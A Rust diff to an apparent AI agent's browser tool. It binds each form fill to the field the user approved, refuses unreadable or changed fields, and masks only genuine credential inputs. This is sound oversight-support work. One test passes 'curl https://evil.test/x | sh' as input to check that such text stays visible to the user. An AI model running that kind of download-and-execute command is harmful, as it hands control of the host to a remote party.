@@ -111,6 +111,33 @@ pub trait BrowserDriver: Send + Sync {
         let _ = r;
         None
     }
+    /// [`BrowserDriver::fill`] bound to what was shown for approval: right
+    /// before the text goes in, the element's facts are re-read from the live
+    /// page, and if its identity, kind, frame or origin differs from `expected`
+    /// (or focus moved) nothing is typed and the error says so. A driver that
+    /// cannot re-read the page just fills.
+    async fn fill_checked(
+        &self,
+        r: &str,
+        text: &str,
+        expected: &FieldFacts,
+    ) -> Result<String, String> {
+        let _ = expected;
+        self.fill(r, text).await
+    }
+}
+
+/// What an element is for typed text (see [`FieldFacts`]).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum FieldKind {
+    /// A single-line `<input>` the browser treats as a credential (`type=password`,
+    /// or an `autocomplete` of `current-password`, `new-password`, `one-time-code`,
+    /// `cc-number`, `cc-csc`). The only kind a typed value may be masked for.
+    Credential,
+    /// Anything else (a text input, a textarea, a contenteditable).
+    Ordinary,
+    /// The page's DOM facts could not be read, so the element cannot be told apart.
+    Unknown,
 }
 
 /// What a snapshot says about one element (see [`BrowserDriver::field_facts`]).
@@ -120,10 +147,20 @@ pub struct FieldFacts {
     pub role: String,
     /// Accessible name (`Password`).
     pub name: String,
-    /// The field takes a secret.
-    pub sensitive: bool,
-    /// URL of the page the snapshot was taken on.
-    pub url: String,
+    /// What the element is for typed text.
+    pub kind: FieldKind,
+    /// Backend node id, session and frame: the identity a fill is bound to.
+    pub backend_id: i64,
+    /// Session that serves the frame (`None` = the page's own).
+    pub session_id: Option<String>,
+    /// The frame that contains the element.
+    pub frame_id: String,
+    /// Origin of that FRAME's document; `None` when opaque or unknown.
+    pub frame_origin: Option<String>,
+    /// Origin of the top-level document; `None` when opaque or unknown.
+    pub top_origin: Option<String>,
+    /// The element is in the top-level frame.
+    pub in_top_frame: bool,
 }
 
 /// Runtime browser settings.
@@ -640,9 +677,45 @@ impl BrowserDriver for CdpDriver {
         Some(FieldFacts {
             role: facts.role,
             name: facts.name,
-            sensitive: facts.sensitive,
-            url: facts.url,
+            kind: match facts.field {
+                browser_cdp::FieldClass::Credential => FieldKind::Credential,
+                browser_cdp::FieldClass::Ordinary => FieldKind::Ordinary,
+                browser_cdp::FieldClass::Unknown => FieldKind::Unknown,
+            },
+            backend_id: facts.backend_id,
+            session_id: facts.session_id,
+            frame_id: facts.frame_id,
+            frame_origin: facts.frame_origin,
+            top_origin: facts.top_origin,
+            in_top_frame: facts.in_top_frame,
         })
+    }
+
+    async fn fill_checked(
+        &self,
+        r: &str,
+        text: &str,
+        expected: &FieldFacts,
+    ) -> Result<String, String> {
+        let bound = browser_cdp::RefFacts {
+            role: expected.role.clone(),
+            name: expected.name.clone(),
+            field: match expected.kind {
+                FieldKind::Credential => browser_cdp::FieldClass::Credential,
+                FieldKind::Ordinary => browser_cdp::FieldClass::Ordinary,
+                FieldKind::Unknown => browser_cdp::FieldClass::Unknown,
+            },
+            backend_id: expected.backend_id,
+            session_id: expected.session_id.clone(),
+            frame_id: expected.frame_id.clone(),
+            frame_origin: expected.frame_origin.clone(),
+            top_origin: expected.top_origin.clone(),
+            in_top_frame: expected.in_top_frame,
+        };
+        let acted = with_session!(self, None, |sess| {
+            sess.page.fill_bound(r, text, &bound).await
+        })?;
+        render_action(&acted)
     }
 
     async fn press(&self, key: &str) -> Result<String, String> {
@@ -1329,6 +1402,25 @@ impl BrowserTool {
             }
             Op::Fill => {
                 let i: FillIn = parse(input)?;
+                // A display placeholder is never a value (a model copying its
+                // own masked history, a replay given the mask).
+                if tool_registry::is_masked_secret(&i.text) {
+                    return Err(exec_err(tool_registry::placeholder_refusal()));
+                }
+                // What the user was shown for this call, else what the page says now.
+                let expected = match take_approved_fill(run_id, &i.r#ref, &i.text) {
+                    Some(x) => Some(x),
+                    None => d.field_facts(&i.r#ref).await,
+                };
+                if expected
+                    .as_ref()
+                    .is_some_and(|x| x.kind == FieldKind::Unknown)
+                {
+                    return Err(exec_err(UNKNOWN_FIELD));
+                }
+                let masked = expected.as_ref().is_some_and(|x| {
+                    x.kind == FieldKind::Credential && tool_registry::is_maskable_secret(&i.text)
+                });
                 let permit = self.gate(run_id, "type", i.r#ref.clone()).await?;
                 if permit.needs_observation()
                     || self
@@ -1355,10 +1447,23 @@ impl BrowserTool {
                         "Human intervention completed; previous action discarded. Fresh observation:\n{fresh}"
                     ));
                 }
-                permit
-                    .protect(async move { d.fill(&i.r#ref, &i.text).await })
+                let text = i.text.clone();
+                let out = permit
+                    .protect(async move {
+                        match expected {
+                            Some(x) => d.fill_checked(&i.r#ref, &i.text, &x).await,
+                            None => d.fill(&i.r#ref, &i.text).await,
+                        }
+                    })
                     .await
-                    .map_err(exec_err)?
+                    .map_err(exec_err)?;
+                // A value shown masked never comes back in clear, whatever the
+                // page did with the field's type meanwhile.
+                if masked {
+                    out.map(|t| t.replace(&text, tool_registry::SECRET_MASK))
+                } else {
+                    out
+                }
             }
             Op::Select => {
                 let i: SelectIn = parse(input)?;
@@ -1625,14 +1730,76 @@ impl Tool for BrowserTool {
         Ok(finish_text(ctx, &self.shared.data_dir.join("spill"), text))
     }
 
+    async fn approval_details(
+        &self,
+        ctx: &ToolContext,
+        input: &Value,
+    ) -> Result<Option<Value>, ToolError> {
+        if matches!(self.op, Op::Fill)
+            && let Ok(i) = serde_json::from_value::<FillIn>(input.clone())
+            && let Ok(selected) = self.scoped(ctx)
+            && selected
+                .shared
+                .driver
+                .field_facts(&i.r#ref)
+                .await
+                .is_some_and(|x| x.kind == FieldKind::Unknown)
+        {
+            return Err(exec_err(UNKNOWN_FIELD));
+        }
+        Ok(None)
+    }
+
     async fn display_input(&self, ctx: &ToolContext, input: &Value) -> Option<Value> {
         if !matches!(self.op, Op::Fill) {
             return None;
         }
         let i: FillIn = serde_json::from_value(input.clone()).ok()?;
         let selected = self.scoped(ctx).ok()?;
-        fill_view(selected.shared.driver.as_ref(), &i.r#ref, &i.text).await
+        let driver = selected.shared.driver.as_ref();
+        let facts = driver.field_facts(&i.r#ref).await?;
+        // What the user is shown is what the fill is bound to at dispatch.
+        remember_approved_fill(&ctx.run_id, &i.r#ref, &i.text, facts.clone());
+        fill_view_of(&facts, &i.r#ref, &i.text)
     }
+}
+
+const UNKNOWN_FIELD: &str = "the page's field facts could not be read, so it cannot be told whether \
+     this field takes a secret; nothing was typed. Take a fresh snapshot and try again.";
+
+/// What was shown for each pending fill: `(run, ref, hash of text)` to the facts
+/// the view was built from. Read at dispatch, which re-reads the live field and
+/// refuses to type if it differs. In memory only; the text is never kept.
+static APPROVED_FILLS: std::sync::LazyLock<
+    parking_lot::Mutex<Vec<((String, String, u64), FieldFacts)>>,
+> = std::sync::LazyLock::new(|| parking_lot::Mutex::new(Vec::new()));
+
+const APPROVED_FILLS_MAX: usize = 64;
+
+fn fill_key(run: &str, r: &str, text: &str) -> (String, String, u64) {
+    use std::hash::{BuildHasher, Hash, Hasher};
+    static KEY: std::sync::LazyLock<std::hash::RandomState> =
+        std::sync::LazyLock::new(std::hash::RandomState::new);
+    let mut h = KEY.build_hasher();
+    text.hash(&mut h);
+    (run.to_owned(), r.to_owned(), h.finish())
+}
+
+fn remember_approved_fill(run: &str, r: &str, text: &str, facts: FieldFacts) {
+    let key = fill_key(run, r, text);
+    let mut all = APPROVED_FILLS.lock();
+    all.retain(|(k, _)| *k != key);
+    if all.len() >= APPROVED_FILLS_MAX {
+        all.remove(0);
+    }
+    all.push((key, facts));
+}
+
+fn take_approved_fill(run: &str, r: &str, text: &str) -> Option<FieldFacts> {
+    let key = fill_key(run, r, text);
+    let mut all = APPROVED_FILLS.lock();
+    let i = all.iter().position(|(k, _)| *k == key)?;
+    Some(all.remove(i).1)
 }
 
 impl BrowserTool {
@@ -1665,41 +1832,43 @@ impl BrowserTool {
     }
 }
 
-/// Origin (`scheme://host[:port]`) of `url`; no path, query, fragment or
-/// credentials. The whole text is dropped when it has no scheme.
-fn origin_of(url: &str) -> Option<String> {
-    let (scheme, rest) = url.split_once("://")?;
-    let authority = rest.split(['/', '?', '#']).next().unwrap_or_default();
-    let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
-    (!host.is_empty()).then(|| format!("{scheme}://{host}"))
-}
-
 /// What the approval, the events, the journal and the stored history show of a
-/// `browser_fill` call: when the field takes a secret (a password, card or
-/// one-time-code field, or a text field the page snapshot could not classify),
-/// the typed text is a masked placeholder and the field and origin are named;
-/// otherwise `None` (ordinary text stays readable). Reads what the last
-/// snapshot already holds, so there is no page round trip. A batch tool must
-/// call this for every `fill` step.
-pub async fn fill_view(driver: &dyn BrowserDriver, r: &str, text: &str) -> Option<Value> {
-    let facts = driver.field_facts(r).await?;
-    if !facts.sensitive {
+/// `browser_fill` call. Only a real credential input (see [`FieldKind`]) and
+/// only a short single-line token ([`tool_registry::is_maskable_secret`]) is
+/// masked: the user can still read anything else in full, whatever the page
+/// says about the field. The view names the field and the origin of the FRAME
+/// that holds it (and, for an iframe, that the page itself is another origin).
+/// `None` shows the call as given.
+#[must_use]
+pub fn fill_view_of(facts: &FieldFacts, r: &str, text: &str) -> Option<Value> {
+    if facts.kind != FieldKind::Credential {
         return None;
     }
+    let masked = tool_registry::display_secret(text, "password field")?;
     let field = if facts.name.is_empty() {
-        facts.role
+        facts.role.clone()
     } else {
         format!("{} \"{}\"", facts.role, facts.name)
     };
+    let origin = |o: &Option<String>| o.clone().unwrap_or_else(|| "opaque (unknown)".to_owned());
     let mut view = json!({
         "ref": r,
         "field": field,
-        "text": tool_registry::masked_secret(text, "password field"),
+        "text": masked,
+        "origin": origin(&facts.frame_origin),
     });
-    if let Some(origin) = origin_of(&facts.url) {
-        view["origin"] = json!(origin);
+    if !facts.in_top_frame {
+        view["note"] = json!(format!(
+            "inside a frame; the page itself is {}",
+            origin(&facts.top_origin)
+        ));
     }
     Some(view)
+}
+
+/// [`fill_view_of`] for the field `r` as the driver's latest snapshot has it.
+pub async fn fill_view(driver: &dyn BrowserDriver, r: &str, text: &str) -> Option<Value> {
+    fill_view_of(&driver.field_facts(r).await?, r, text)
 }
 
 #[cfg(test)]
@@ -1720,6 +1889,9 @@ pub(crate) mod fake {
         pub hook: PMutex<Option<FakeHook>>,
         /// What the latest snapshot says about a ref (`field_facts`).
         pub facts: PMutex<std::collections::HashMap<String, FieldFacts>>,
+        /// What the live page says at dispatch, when it differs from the
+        /// snapshot (a field retyped, swapped or moved after approval).
+        pub live: PMutex<std::collections::HashMap<String, FieldFacts>>,
     }
 
     impl FakeBrowser {
@@ -1784,6 +1956,23 @@ pub(crate) mod fake {
             self.click_opts(r, None, None).await
         }
         async fn fill(&self, r: &str, t: &str) -> Result<String, String> {
+            self.rec(&format!("fill:{r}:{t}"))
+        }
+        async fn fill_checked(
+            &self,
+            r: &str,
+            t: &str,
+            expected: &FieldFacts,
+        ) -> Result<String, String> {
+            let now = self
+                .live
+                .lock()
+                .get(r)
+                .cloned()
+                .or_else(|| self.facts.lock().get(r).cloned());
+            if now.as_ref() != Some(expected) {
+                return Err("the field is no longer the one that was shown for approval".into());
+            }
             self.rec(&format!("fill:{r}:{t}"))
         }
         async fn select(&self, r: &str, v: &str) -> Result<String, String> {
@@ -1882,25 +2071,35 @@ mod tests {
         }
     }
 
-    fn facts(role: &str, name: &str, sensitive: bool) -> FieldFacts {
+    fn facts(role: &str, name: &str, kind: FieldKind) -> FieldFacts {
         FieldFacts {
             role: role.into(),
             name: name.into(),
-            sensitive,
-            url: "https://user:pw@login.example.test:8443/path?q=1#f".into(),
+            kind,
+            backend_id: 5,
+            session_id: None,
+            frame_id: "main".into(),
+            frame_origin: Some("https://login.example.test:8443".into()),
+            top_origin: Some("https://login.example.test:8443".into()),
+            in_top_frame: true,
         }
     }
 
+    const SECRET: &str = "hunter2-fake-fixture-value";
+
+    fn with_field(fake: &FakeBrowser, r: &str, f: FieldFacts) {
+        fake.facts.lock().insert(r.into(), f);
+    }
+
     #[tokio::test]
-    async fn a_password_fill_shows_masked_with_field_and_origin_but_types_the_real_value() {
-        const SECRET: &str = "hunter2-fake-fixture-value";
+    async fn a_credential_fill_shows_masked_with_field_and_frame_origin_but_types_the_real_value() {
         let (_d, fake, t) = build();
-        fake.facts
-            .lock()
-            .insert("e5".into(), facts("textbox", "Password", true));
-        fake.facts
-            .lock()
-            .insert("e6".into(), facts("textbox", "Search", false));
+        with_field(
+            &fake,
+            "e5",
+            facts("textbox", "Password", FieldKind::Credential),
+        );
+        with_field(&fake, "e6", facts("textbox", "Search", FieldKind::Ordinary));
         let fill = get(&t, "browser_fill");
         let ctx = ToolContext::default();
 
@@ -1910,33 +2109,29 @@ mod tests {
             .expect("a password field is masked");
         let shown_text = shown.to_string();
         assert!(!shown_text.contains(SECRET), "{shown_text}");
-        assert!(
-            !shown_text.contains("hunter"),
-            "no prefix either: {shown_text}"
-        );
+        assert!(!shown_text.contains("hunter"), "no prefix: {shown_text}");
         assert_eq!(shown["ref"], "e5");
         assert_eq!(shown["field"], "textbox \"Password\"");
         assert_eq!(shown["origin"], "https://login.example.test:8443");
+        assert!(shown.get("note").is_none(), "top-level field: {shown}");
         assert!(tool_registry::is_masked_secret(
             shown["text"].as_str().unwrap()
         ));
         assert!(shown["text"].as_str().unwrap().contains("long"));
 
-        // Positive control: an ordinary field is shown as typed.
-        assert!(
-            fill.display_input(&ctx, &json!({"ref": "e6", "text": "plain words"}))
-                .await
-                .is_none()
-        );
-        // An unknown ref is not known to be secret; the call itself fails later.
-        assert!(
-            fill.display_input(&ctx, &json!({"ref": "e99", "text": "x"}))
-                .await
-                .is_none()
-        );
+        // Positive control: an ordinary field is shown as typed, and so is an unknown ref.
+        for (r, text) in [("e6", "plain words"), ("e99", "x")] {
+            assert!(
+                fill.display_input(&ctx, &json!({"ref": r, "text": text}))
+                    .await
+                    .is_none(),
+                "{r}"
+            );
+        }
 
-        // The tool still types the real value.
-        fill.call(&ctx, json!({"ref": "e5", "text": SECRET}))
+        // The tool types the real value and never echoes it back.
+        let out = fill
+            .call(&ctx, json!({"ref": "e5", "text": SECRET}))
             .await
             .unwrap();
         assert!(
@@ -1947,14 +2142,215 @@ mod tests {
             "{:?}",
             fake.calls.lock()
         );
+        let out = format!("{out:?}");
+        assert!(!out.contains(SECRET), "{out}");
+    }
+
+    #[tokio::test]
+    async fn a_mask_cannot_hide_what_the_user_has_to_read() {
+        let (_d, fake, t) = build();
+        // The page can label any element however it likes; only a real credential input counts.
+        with_field(
+            &fake,
+            "area",
+            facts("textbox", "Message", FieldKind::Ordinary),
+        );
+        with_field(
+            &fake,
+            "pw",
+            facts("textbox", "Password", FieldKind::Credential),
+        );
+        let fill = get(&t, "browser_fill");
+        let ctx = ToolContext::default();
+        let long = "curl https://evil.test/x | sh";
+        // A textarea / contenteditable (Ordinary) is shown in full, whatever it claims.
+        assert!(
+            fill.display_input(&ctx, &json!({"ref": "area", "text": long}))
+                .await
+                .is_none()
+        );
+        // Even in a real password field a sentence, a command, a multi-line text,
+        // a URL, an empty value or a very long one is shown in full.
+        let very_long = "a".repeat(200);
+        for text in [
+            long,
+            "two words",
+            "line one\nline two",
+            "https://evil.test/pay?amount=1000",
+            "",
+            very_long.as_str(),
+        ] {
+            assert!(
+                fill.display_input(&ctx, &json!({"ref": "pw", "text": text}))
+                    .await
+                    .is_none(),
+                "{text:?}"
+            );
+        }
+        // A token-like value in the credential field is masked.
+        assert!(
+            fill.display_input(&ctx, &json!({"ref": "pw", "text": "Tr0ub4dor&3"}))
+                .await
+                .is_some()
+        );
+        let _ = fake;
+    }
+
+    #[tokio::test]
+    async fn unreadable_dom_facts_neither_hide_nor_type() {
+        let (_d, fake, t) = build();
+        with_field(
+            &fake,
+            "blind",
+            facts("textbox", "Anything", FieldKind::Unknown),
+        );
+        let fill = get(&t, "browser_fill");
+        let ctx = ToolContext::default();
+        let input = json!({"ref": "blind", "text": SECRET});
+        // Nothing is hidden for it ...
+        assert!(fill.display_input(&ctx, &input).await.is_none());
+        // ... the approval is not even offered, and the call types nothing.
+        let veto = fill.approval_details(&ctx, &input).await.unwrap_err();
+        assert!(veto.to_string().contains("could not be read"), "{veto}");
+        let err = fill.call(&ctx, input).await.unwrap_err();
+        assert!(err.to_string().contains("could not be read"), "{err}");
+        assert!(!fake.calls.lock().iter().any(|c| c.starts_with("fill:")));
+    }
+
+    #[tokio::test]
+    async fn an_iframe_field_names_the_frame_origin_and_the_page_it_sits_in() {
+        let (_d, fake, t) = build();
+        let mut f = facts("textbox", "Password", FieldKind::Credential);
+        f.frame_origin = Some("https://evil.test".into());
+        f.top_origin = Some("https://trusted.test".into());
+        f.in_top_frame = false;
+        f.frame_id = "child".into();
+        with_field(&fake, "e5", f);
+        let shown = get(&t, "browser_fill")
+            .display_input(
+                &ToolContext::default(),
+                &json!({"ref": "e5", "text": SECRET}),
+            )
+            .await
+            .unwrap();
+        assert_eq!(shown["origin"], "https://evil.test");
+        let note = shown["note"].as_str().unwrap();
+        assert!(
+            note.contains("frame") && note.contains("https://trusted.test"),
+            "{note}"
+        );
+
+        // An opaque origin is said to be unknown, never replaced by the page's.
+        let mut o = facts("textbox", "Password", FieldKind::Credential);
+        o.frame_origin = None;
+        o.in_top_frame = false;
+        o.top_origin = Some("https://trusted.test".into());
+        with_field(&fake, "e6", o);
+        let shown = get(&t, "browser_fill")
+            .display_input(
+                &ToolContext::default(),
+                &json!({"ref": "e6", "text": SECRET}),
+            )
+            .await
+            .unwrap();
+        assert!(
+            shown["origin"].as_str().unwrap().contains("unknown"),
+            "{shown}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_fill_is_refused_when_the_field_is_not_the_one_that_was_shown() {
+        let ctx = ToolContext::default();
+        let input = json!({"ref": "e5", "text": SECRET});
+        let credential = facts("textbox", "Password", FieldKind::Credential);
+        let ordinary = facts("textbox", "Password", FieldKind::Ordinary);
+        let mut moved = credential.clone();
+        moved.frame_origin = Some("https://other.test".into());
+        let mut swapped = credential.clone();
+        swapped.backend_id = 99;
+        let cases = [
+            // password -> ordinary after approval (the masked approval hid nothing real, but
+            // the value would now land in a field that shows it).
+            (
+                credential.clone(),
+                ordinary.clone(),
+                "password flipped to text",
+            ),
+            // ordinary -> password after the user saw the text in clear.
+            (
+                ordinary.clone(),
+                credential.clone(),
+                "text flipped to password",
+            ),
+            (
+                credential.clone(),
+                moved,
+                "frame navigated to another origin",
+            ),
+            (
+                credential.clone(),
+                swapped,
+                "another element answers to the ref",
+            ),
+        ];
+        for (shown_as, live, label) in cases {
+            let (_d, fake, t) = build();
+            with_field(&fake, "e5", shown_as);
+            let fill = get(&t, "browser_fill");
+            let _ = fill.display_input(&ctx, &input).await;
+            // The page changes between the approval and the dispatch.
+            fake.live.lock().insert("e5".into(), live);
+            let err = fill.call(&ctx, input.clone()).await.unwrap_err();
+            assert!(
+                err.to_string().contains("no longer the one"),
+                "{label}: {err}"
+            );
+            assert!(
+                !fake.calls.lock().iter().any(|c| c.starts_with("fill:")),
+                "{label}: typed anyway"
+            );
+        }
+        // Control: unchanged, the same call types.
+        let (_d, fake, t) = build();
+        with_field(&fake, "e5", credential);
+        let fill = get(&t, "browser_fill");
+        let _ = fill.display_input(&ctx, &input).await;
+        fill.call(&ctx, input).await.unwrap();
+        assert!(fake.calls.lock().iter().any(|c| c.starts_with("fill:e5:")));
+    }
+
+    #[tokio::test]
+    async fn the_fill_tool_refuses_to_type_a_display_placeholder() {
+        let (_d, fake, t) = build();
+        with_field(
+            &fake,
+            "e5",
+            facts("textbox", "Password", FieldKind::Credential),
+        );
+        let placeholder = tool_registry::with_secret_ref(
+            &tool_registry::masked_secret(SECRET, "password field"),
+            "abc123",
+        );
+        let err = get(&t, "browser_fill")
+            .call(
+                &ToolContext::default(),
+                json!({"ref": "e5", "text": placeholder}),
+            )
+            .await
+            .unwrap_err();
+        assert!(err.to_string().contains("placeholder"), "{err}");
+        assert!(!fake.calls.lock().iter().any(|c| c.starts_with("fill:")));
     }
 
     #[tokio::test]
     async fn only_browser_fill_has_a_display_input() {
         let (_d, fake, t) = build();
-        fake.facts
-            .lock()
-            .insert("e5".into(), facts("textbox", "Password", true));
+        with_field(
+            &fake,
+            "e5",
+            facts("textbox", "Password", FieldKind::Credential),
+        );
         for name in [
             "browser_click",
             "browser_select",
@@ -1969,16 +2365,6 @@ mod tests {
                 "{name}"
             );
         }
-    }
-
-    #[test]
-    fn origin_drops_credentials_path_query_and_fragment() {
-        assert_eq!(
-            origin_of("https://u:p@a.example/x?y#z").as_deref(),
-            Some("https://a.example")
-        );
-        assert_eq!(origin_of("about:blank"), None);
-        assert_eq!(origin_of(""), None);
     }
 
     #[test]
